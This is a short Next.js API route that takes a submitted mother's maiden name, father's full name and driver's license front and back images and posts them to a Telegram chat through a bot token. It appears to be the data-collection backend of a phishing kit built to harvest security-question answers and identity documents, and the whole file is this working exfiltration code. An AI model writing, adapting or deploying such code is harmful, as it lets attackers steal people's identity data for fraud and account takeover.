import axios from "axios";
import { NextResponse } from "next/server";

export async function POST(req: Request) {
    try {
        const data = await req.json();

        // Replace with actual bot token and chat ID
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!botToken || !chatId) {
            return NextResponse.json(
                { success: false, message: "Bot token or chat ID missing." },
                { status: 500 }
            );
        }

        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // Construct message text from received data
        const text = `
Mothers Maiden Name: ${data.mothersMaidenName}
Father's Fullname: ${data.fathersFullName}
 Drivers License Front Page: ${data.driverLicenseFp}
Drivers License Back Page: ${data.driverLicenseBp}
`;

        const response = await axios.post(telegramUrl, {
            chat_id: chatId,
            text: text,
            parse_mode: "Markdown", // Allows formatting in the message
        });

        if (response.data.ok) {
            return NextResponse.json({ success: true, message: "Message sent successfully!" });
        } else {
            return NextResponse.json({ success: false, message: "Failed to send message." }, { status: 500 });
        }
    } catch (error) {
        console.error("Error sending message to Telegram:", error);
        return NextResponse.json({ success: false, message: "Error sending message." }, { status: 500 });
    }
}
